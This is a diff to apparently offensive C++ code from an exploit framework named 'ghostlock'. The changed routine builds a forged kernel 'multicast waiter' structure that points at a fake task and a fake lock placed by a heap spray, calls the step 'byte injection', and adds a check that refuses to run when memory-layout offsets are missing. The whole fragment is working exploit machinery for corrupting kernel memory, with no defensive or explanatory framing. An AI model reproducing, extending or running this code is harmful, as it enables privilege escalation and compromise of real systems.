@@ -20,22 +20,36 @@ namespace ghostlock::route {
         route::RouteStatus status = {.code = ROUTE_RETRYABLE};
         profile::MulticastWaiterLayout layout =
                 session::g_exploit_session.profile.multicast_layout();
-        size_t stamp_size = layout.buffer_size;
+        /* Absent geometry (e.g. an underivable waiter_off) is a hard refusal:
+         * one-shot multicast must never guess a landing. */
+        if (!layout.buffer_size || !layout.waiter_offset || !layout.task_offset ||
+            !layout.lock_offset) {
+            status.step = 58;
+            status.error_number = EINVAL;
+            status.userspace_clean = 1;
+            status.kernel_disarmed = 1;
+            status.code = ROUTE_FALLBACK_SAFE;
+            pr_warning("multicast geometry incomplete (waiter_off not provided)\n");
+            return status;
+        }
+        const size_t stamp_size = *layout.buffer_size;
         /* VLA size comes from the validated profile geometry; the encode step
      * rejects an undersized buffer before any indexed write. */
     __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
         memset(stamp, 0, sizeof(stamp));
         if (!memory::encode_multicast_waiter(
             {reinterpret_cast<std::byte *>(stamp), stamp_size},
-            layout.waiter_offset, layout.task_offset, layout.lock_offset,
+            static_cast<size_t>(*layout.waiter_offset), *layout.task_offset,
+            *layout.lock_offset,
             (session::g_exploit_session.heap.current.fake_task), (session::g_exploit_session.heap.current.fake_lock))) {
             status.step = 59;
             status.error_number = EOVERFLOW;
             status.userspace_clean = 1;
             status.kernel_disarmed = 1;
             pr_warning("multicast byte injection rejected: waiter=%zu task=%zu "
-                       "lock=%zu buffer=%zu\n", layout.waiter_offset,
-                       layout.task_offset, layout.lock_offset, stamp_size);
+                       "lock=%zu buffer=%zu\n", static_cast<size_t>(*layout.waiter_offset),
+                       static_cast<size_t>(*layout.task_offset),
+                       static_cast<size_t>(*layout.lock_offset), stamp_size);
             return status;
         }
         uint16_t family = AF_UNSPEC;
